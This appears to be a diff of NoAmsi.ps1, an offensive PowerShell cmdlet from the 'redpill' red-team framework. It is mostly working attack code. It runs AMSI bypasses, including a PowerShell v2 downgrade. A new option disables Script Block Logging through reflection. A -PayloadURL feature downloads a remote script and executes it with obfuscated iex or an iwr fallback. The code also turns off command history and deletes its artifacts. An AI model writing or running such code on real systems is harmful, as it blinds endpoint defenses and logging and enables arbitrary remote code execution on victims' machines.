@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (19042) x64 bits
    Required Dependencies: none
    Optional Dependencies: none
-   PS cmdlet Dev version: v2.5.12
+   PS cmdlet Dev version: v2.6.15
    
 .DESCRIPTION
    This cmdlet tests an internal list of amsi_bypass_technics on
@@ -30,10 +30,13 @@
 
 .Parameter PayloadURL
   The URL script.ps1 to be downloaded\executed! (default: false)
+
+.Parameter ScriptBlockLogging
+   Accepts arguments: ON, OFF (default: ON)
    
 .EXAMPLE
    PS C:\> Get-Help .\NoAmsi.ps1 -full
-   Access this cmdlet comment based help   
+   Access this cmdlet comment based help
 
 .EXAMPLE
    PS C:\> .\NoAmsi.ps1 -Action List
@@ -46,6 +49,10 @@
 .EXAMPLE
    PS C:\> .\NoAmsi.ps1 -Action Bypass -Id 2
    Execute Amsi_bypass technic nº2 on current shell!
+
+.EXAMPLE
+   PS C:\> .\NoAmsi.ps1 -Action Bypass -Id 2 -ScriptBlockLogging OFF
+   Execute Amsi_bypass technic nº2 and Disable PS ScriptBlockLogging!
 
 .EXAMPLE
    PS C:\> .\NoAmsi.ps1 -Action bypass -PayloadURL "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/modules/GetSkype.ps1"
@@ -95,11 +102,13 @@
 .LINK
    https://github.com/r00t-3xp10it/redpill
    https://news.sophos.com/en-us/2021/06/02/amsi-bypasses-remain-tricks-of-the-malware-trade
+   https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows
 #>
 
 
 ## Non-Positional cmdlet named parameters
 [CmdletBinding(PositionalBinding=$false)] param(
+   [string]$ScriptBlockLogging="ON",
    [string]$PayloadURL="false",
    [string]$Action="Bypass",
    [int]$Id='2'
@@ -107,7 +116,7 @@
 
 
 $viriato='0'#Redpill Conf
-$CmdletVersion = "v2.5.12"
+$CmdletVersion = "v2.6.15"
 ## Global cmdlet variable declarations
 $ErrorActionPreference = "SilentlyContinue"
 ## Disable Powershell Command Logging for current session.
@@ -115,11 +124,11 @@ Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
 $host.UI.RawUI.WindowTitle = "@NoAmsi $CmdletVersion {SSA@RedTeam}"
 
 
-If($PayloadURL -ne "false" -and $Id -eq "1")
+If($PayloadURL -ne "false" -and $Id -Match '^(0|1)$')
 {
+   Write-Host "`n[error:] -PayloadURL '<url>' does not work with Id:$Id" -ForegroundColor Red -BackgroundColor Black
+   Write-Host "Defaulting to Id:2 <DL`L_REFLEC`TION_BYPAS`S>";Start-Sleep -Seconds 2
    $Id = "2" #Default Technic to use!
-   Write-Host "[error:] -PayloadURL '<url>' does not work with Id:1" -ForegroundColor Red -BackgroundColor Black
-   Write-Host "[syntax] Defaulting to Id:2 <DL`L_REFLEC`TION_BYPAS`S>" -ForegroundColor Yellow;Start-Sleep -Seconds 2
 }
 
 If($Action -iNotMatch '^(List|TestAll|Bypass)$')
@@ -153,7 +162,7 @@ If($Action -ieq "List")
       Helper - List ALL cmdlet bypasses available!
    #>
 
-   Write-Host "`n`nId Disclosure       Description            Requirements" -ForegroundColor Green
+   Write-Host "`nId Disclosure       Description            Requirements" -ForegroundColor Green
    Write-Host "-- ----------       -----------            ------------"
    Write-Host "1  @nullbyte        PS_DOW`NGRADE_ATT`ACK    PS_version2"
    Write-Host "2  @mattifestation  DL`L_REFL`ECTION         None"
@@ -173,6 +182,42 @@ If($Action -ieq "List")
    }
    exit ## Exit @NoAmsi
    
+}
+
+
+If($ScriptBlockLogging -iMatch '^(OFF)$')
+{
+
+   <#
+   .SYNOPSIS
+      Author: @r00t-3xp10it
+      Helper - Disable Powershell Script Block Logging!
+
+   .NOTES
+      None Administrator privileges required!
+   #>
+
+   $AbasePath = 'HKLM:\Software\Policies\Microsoft\Windows' + '\PowerShell\ScriptBlockLogging' -join ''
+   $CheckMate = Get-ItemPropertyValue -Path "$AbasePath" -Name "ScriptBlockLogging" -EA SilentlyContinue
+   If($CheckMate -Match '^(1)$')
+   {
+
+      try{#Disable Script Block Logging!
+         Write-Host "`n[ii] Script Logging reg key found, trying to disable it!" -ForegroundColor Red -BackgroundColor Black
+         [Ref].Assembly.GetType("System.Management.Automation.ScriptBlock").GetField("signatures","NonPublic,static").SetValue($null, (New-Object 'System.Collections.Generic.HashSet[string]'))
+         Start-Sleep -Seconds 1;Write-Host "[OK] Powershell Script Block Logging disabled!" -ForegroundColor DarkCyan
+      }catch{
+         Start-Sleep -Seconds 1
+         Write-Host "[xx] NoAmsi cmdlet failed to disable Script Block Logging .." -ForegroundColor Red -BackgroundColor Black
+      }
+
+   }
+   Else
+   {
+      Write-Host "`n[OK] Script Block Logging registry key NOT present\found!" -ForegroundColor DarkCyan
+      Write-Host "[OK] Powershell Script Block Logging allready disabled?" -ForegroundColor DarkCyan
+   }
+
 }
 
 
@@ -200,79 +245,62 @@ If($Action -ieq "Bypass")
          Helper - PS_DOWN`GRADE_ATT`ACK!
 
       .NOTES
-         This function uses powershell version 2 to create testme.log
-         on %tmp% directory. Then NoAmsi cmdlet will check for bypass
-         by checking if the logfile as successfull created on %tmp%
+         This function uses powershell version 2 if available!
       #>
 
-      try{
+      $NETversions = (Get-ChildItem "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP" -recurse | Get-ItemProperty -name Version -EA 0 | Where-Object { $_.PSChildName -match '^(?!S)\p{L}' }).Version
+      if($NETversions -Match "2.0.50727")
+      {
 
-         Start-Process -WindowStyle Hidden powershell.exe -ArgumentList "-version 2 -C Get-Host > $Env:TMP\testme.log" -Wait
-         If(Test-Path -Path "$Env:TMP\testme.log" -ErrorAction SilentlyContinue)
-         {
-            ## Make sure version 2.0 its available before go any further!
-            $PS2version = Get-Content -Path "$Env:TMP\testme.log" | 
-               Where-Object { $_ -iMatch '^(Version)' -and $_ -Match '(: 2.0)$'
+         ## retrieve current PS version
+         $CurrentPSv = (Get-Host).Version.Major
+
+         ## add results to table
+         $mytable.Rows.Add("1",
+                           "success",
+                           "@nullbyte",
+                           "PS_DOWNG`RADE_ATT`ACK",
+                           "Execute: `"$JPGformat`"",
+                           "Execute: 'exit' to return to PSv$CurrentPSv console!")|Out-Null
+
+         #Display Output Table
+         $mytable | Format-List > $env:TMP\tbl.log
+         Get-Content -Path "$env:TMP\tbl.log" | Select-Object -Skip 2 |
+            Out-String -Stream | ForEach-Object {
+               $stringformat = If($_ -Match '(success)$'){
+                  @{ 'ForegroundColor' = 'Green' } }Else{ @{ } }
+               Write-Host @stringformat $_
             }
 
-            If(-not($PS2version))
-            {
-               ## add results to table
-               $mytable.Rows.Add("1",
-                                 "failed",
-                                 "@nullbyte",
-                                 "PS_DOWNG`RADE_ATT`ACK",
-                                 "powershell -version 2 -C Get-Host",
-                                 "Powershell version 2 not found in $Env:COMPUTERNAME!")|Out-Null
+         #Delete artifact {logfile} left behind!
+         Remove-Item -Path "$Env:TMP\tbl.log" -Force
+         powershell -version 2
 
-               #Display Output Table
-               $mytable | Format-List > $env:TMP\tbl.log
-               Get-Content -Path "$env:TMP\tbl.log" | Select-Object -Skip 2 |
-                  Out-String -Stream | ForEach-Object {
-                     $stringformat = If($_ -Match '(failed)$'){
-                        @{ 'ForegroundColor' = 'Red';'BackgroundColor' = 'Black' } }Else{ @{ } }
-                     Write-Host @stringformat $_
-                  }
+      }
+      Else
+      {
 
-               #Delete artifact {logfile} left behind!
-               Remove-Item -Path "$Env:TMP\tbl.log" -Force
-               Remove-Item -Path "$Env:TMP\testme.log" -Force
+         ## add results to table
+         $mytable.Rows.Add("1",
+                           "failed",
+                           "@nullbyte",
+                           "PS_DOWNG`RADE_ATT`ACK",
+                           "powershell -version 2 -C Get-Host",
+                           ".Net version 2.0.50727 not found. Can't start PowerShell v2.")|Out-Null
+
+         #Display Output Table
+         $mytable | Format-List > $env:TMP\tbl.log
+         Get-Content -Path "$env:TMP\tbl.log" | Select-Object -Skip 2 |
+            Out-String -Stream | ForEach-Object {
+               $stringformat = If($_ -Match '(failed)$'){
+                  @{ 'ForegroundColor' = 'Red';'BackgroundColor' = 'Black' } }Else{ @{ } }
+               Write-Host @stringformat $_
             }
-            Else
-            {
-               ## retrieve current PS version
-               $CurrentPSv = (Get-Host).Version.Major
 
-               ## add results to table
-               $mytable.Rows.Add("1",
-                                 "success",
-                                 "@nullbyte",
-                                 "PS_DOWNG`RADE_ATT`ACK",
-                                 "Execute: `"$JPGformat`"",
-                                 "Execute: 'exit' to return to PSv$CurrentPSv console!")|Out-Null
+         #Delete artifact {logfile} left behind!
+         Remove-Item -Path "$Env:TMP\tbl.log" -Force
 
-               #Display Output Table
-               $mytable | Format-List > $env:TMP\tbl.log
-               Get-Content -Path "$env:TMP\tbl.log" | Select-Object -Skip 2 |
-                  Out-String -Stream | ForEach-Object {
-                     $stringformat = If($_ -Match '(success)$'){
-                        @{ 'ForegroundColor' = 'Green' } }Else{ @{ } }
-                     Write-Host @stringformat $_
-                  }
-
-               #Delete artifact {logfile} left behind!
-               Remove-Item -Path "$Env:TMP\tbl.log" -Force
-               Remove-Item -Path "$Env:TMP\testme.log" -Force
-               powershell -version 2
-            }
-         }
-         Else
-         {
-            Write-Host "[error] executing 'PS_DOWNG`RADE_ATT`ACK' bypass!" -ForegroundColor Red -BackgroundColor Black
-            Write-Host "`n"
-         }
-
-      }catch{}
+      }
 
    }
    ElseIf($Id -eq 2)
@@ -635,66 +663,52 @@ If($Action -ieq "TestAll")
          Helper - PS_DOWNG`RADE_ATT`ACK!
       #>
 
-      try{
+      $NETversions = (Get-ChildItem "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP" -recurse | Get-ItemProperty -name Version -EA 0 | Where-Object { $_.PSChildName -match '^(?!S)\p{L}' }).Version
+      if($NETversions -Match "2.0.50727")
+      {
 
-         Start-Process -WindowStyle Hidden powershell.exe -ArgumentList "-version 2 -C Get-Host > $Env:TMP\testme.log" -Wait
-         If(Test-Path -Path "$Env:TMP\testme.log" -ErrorAction SilentlyContinue)
-         {
-            ## Make sure version 2.0 its available before go any further!
-            $PS2version = Get-Content -Path "$Env:TMP\testme.log" | 
-               Where-Object { $_ -iMatch '^(Version)' -and $_ -Match '(: 2.0)$'
+         ## retrieve current PS version
+         $CurrentPSv = (Get-Host).Version.Major
+
+         ## add results to table
+         $mytable.Rows.Add("1",
+                           "success",
+                           "@nullbyte",
+                           "PS_DOWNG`RADE_ATT`ACK",
+                           "Execute: `"$JPGformat`"",
+                           "Execute: 'exit' to return to PSv$CurrentPSv console!")|Out-Null
+
+         #Display Output Table
+         $mytable | Format-List > $env:TMP\tbl.log
+         Get-Content -Path "$env:TMP\tbl.log" | Select-Object -Skip 2 |
+            Out-String -Stream | ForEach-Object {
+               $stringformat = If($_ -Match '(success)$'){
+                  @{ 'ForegroundColor' = 'Green' } }Else{ @{ } }
+               Write-Host @stringformat $_
             }
 
-            If(-not($PS2version))
-            {
-               ## add results to table
-               $mytable.Rows.Add("1",
-                                 "failed",
-                                 "@nullbyte",
-                                 "PS_DOWNG`RADE_ATT`ACK",
-                                 "powershell -version 2 -C Get-Host",
-                                 "Powershell version 2 not found in $Env:COMPUTERNAME")|Out-Null
+         #Delete artifact {logfile} left behind!
+         Remove-Item -Path "$Env:TMP\tbl.log" -Force
+         powershell -version 2
+         #success exec = exit
+         exit
 
-               #Delete artifact {logfile} left behind!
-               Remove-Item -Path "$Env:TMP\testme.log" -Force
-            }
-            Else
-            {
-               ## retrieve current PS version
-               $CurrentPSv = (Get-Host).Version.Major
+      }
+      Else
+      {
 
-               ## add results to table
-               $mytable.Rows.Add("1",
-                                 "success",
-                                 "@nullbyte",
-                                 "PS_DOWNG`RADE_ATT`ACK",
-                                 "Execute: `"$JPGformat`"",
-                                 "Execute: 'exit' to return to PSv$CurrentPSv console!")|Out-Null
+         ## add results to table
+         $mytable.Rows.Add("1",
+                           "failed",
+                           "@nullbyte",
+                           "PS_DOWNG`RADE_ATT`ACK",
+                           "powershell -version 2 -C Get-Host",
+                           ".Net version 2.0.50727 not found. Can't start PowerShell v2.")|Out-Null
 
-               #Display Output Table
-               $mytable | Format-List > $env:TMP\tbl.log
-               Get-Content -Path "$env:TMP\tbl.log" | Select-Object -Skip 2 |
-                  Out-String -Stream | ForEach-Object {
-                     $stringformat = If($_ -Match '(success)$'){
-                        @{ 'ForegroundColor' = 'Green' } }Else{ @{ } }
-                     Write-Host @stringformat $_
-                  }
+         #Delete artifact {logfile} left behind!
+         Remove-Item -Path "$Env:TMP\tbl.log" -Force
 
-               #Delete artifact {logfile} left behind!
-               Remove-Item -Path "$Env:TMP\tbl.log" -Force
-               Remove-Item -Path "$Env:TMP\testme.log" -Force
-               powershell -version 2
-               #success exec = exit
-               exit
-            }
-         }
-         Else
-         {
-            Write-Host "[error] executing 'PS_DOWNG`RADE_ATT`ACK' bypass!" -ForegroundColor Red -BackgroundColor Black
-            Write-Host "`n"      
-         }
-
-      }catch{}
+	  }
 
        <#
       .SYNOPSIS
@@ -1028,7 +1042,7 @@ If($PayloadURL -ne "false")
       manualy edit NoAmsi.ps1 cmdlet and append the arguments to the follow line:
 
       #Executing cmdlet
-      Import-Module -Name .\$RawName.ps1 -Force;&"$RawName" #<INPUT_CMDLET_ARGUMENT_LIST>
+      Import-Module -Name .\${RawName}.${extension} -Force;&"$RawName" #<INPUT_CMDLET_ARGUMENT_LIST>
 
    .NOTES
       redpill framework allow attackers to execute the -payloadURL '<url>' with args!
@@ -1036,7 +1050,8 @@ If($PayloadURL -ne "false")
 
    #Parse URL data
    $DomainName = $PayloadURL.Split('/')[2]
-   $RawName = ($PayloadURL.Split('/')[-1]) -replace '.ps1',''
+   $extension = $PayloadURL.Split('.')[-1]
+   $RawName = ($PayloadURL.Split('/')[-1]) -replace '(.ps1|.psm1|.psd1)$',''
 
    If($PayloadURL -iNotMatch '^[http(s)://]')
    {
@@ -1045,10 +1060,10 @@ If($PayloadURL -ne "false")
       Write-Host "";Start-Sleep -Seconds 2;exit ## @NoAmsi    
    }
    
-   If($PayloadURL -iNotMatch '(.ps1)$')
+   If($PayloadURL -iNotMatch '(.ps1|.psm1|.psd1)$')
    {
       #Wrong download fileformat syntax user input
-      Write-Host "[error] -PayloadURL '<url>' only accepts script.PS1 file formats!" -ForegroundColor Red -BackgroundColor Black
+      Write-Host "[error] -PayloadURL '<url>' only accepts script.PS1|PSM1|PSD1 file formats!" -ForegroundColor Red -BackgroundColor Black
       Write-Host "";Start-Sleep -Seconds 2;exit ## @NoAmsi    
    }
 
@@ -1062,7 +1077,7 @@ If($PayloadURL -ne "false")
    }
 
    #Build Table display
-   Write-Host "Download\Execute '$RawName.ps1'" -ForegroundColor Yellow
+   Write-Host "Download\Execute '${RawName}.${extension}'" -ForegroundColor Yellow
    Write-Host "* [connecting to] $DomainName TCP $PortNumber .." -ForegroundColor DarkCyan
    Write-Host "     uri: $PayloadURL`n" -ForegroundColor DarkCyan 
 
@@ -1070,23 +1085,23 @@ If($PayloadURL -ne "false")
    $TORnetwork=New-Object -ComObject Msxml2.XMLHTTP;$TORnetwork.open('GET',"$PayloadURL",$false);$TORnetwork.send();i`ex $TORnetwork.responseText
 
    try{#Executing cmdlet
-      Import-Module -Name .\$RawName.ps1 -Force;&"$RawName" #<INPUT_CMDLET_ARGUMENT_LIST>
+      Import-Module -Name .\${RawName}.${extension} -Force;&"$RawName" #<INPUT_CMDLET_ARGUMENT_LIST>
    }catch{
-      iwr -Uri "$PayloadURL" -OutFile "$Env:TMP\$RawName.ps1"
-      Write-Host "* fail to import $RawName (fileless), defaulting to IWR (local download)`n" -ForegroundColor Red -BackgroundColor Black
-      Start-Sleep -Seconds 3;&"$Env:TMP\$RawName.ps1" #<INPUT_CMDLET_ARGUMENT_LIST>   
+      iwr -Uri "$PayloadURL" -OutFile "$Env:TMP\${RawName}.${extension}"
+      Write-Host "* fail to import ${RawName}.${extension} (fileless), defaulting to IWR (local download)`n" -ForegroundColor Red -BackgroundColor Black
+      Start-Sleep -Seconds 3;&"$Env:TMP\${RawName}.${extension}" #<INPUT_CMDLET_ARGUMENT_LIST>   
    }
 
    If(-not($?))
    {
-      Write-Host "[error] something went wrong executing\downloading $RawName.ps1!`n" -ForegroundColor Red -BackgroundColor Black
-      Write-Host "";exit ## @NoAmsi
+      Write-Host "[error] something went wrong executing\downloading ${RawName}.${extension}!`n" -ForegroundColor Red -BackgroundColor Black
+      Write-Host ""
    }
                        
 }
 
 ## Delete artifacts left behind
-If(Test-Path -Path "$Env:TMP\$RawName.ps1" -ErrorAction SilentlyContinue)
+If(Test-Path -Path "$Env:TMP\${RawName}.${extension}" -ErrorAction SilentlyContinue)
 {
-   Remove-Item -Path "$Env:TMP\$RawName.ps1" -Force
+   Remove-Item -Path "$Env:TMP\${RawName}.${extension}" -Force
 }
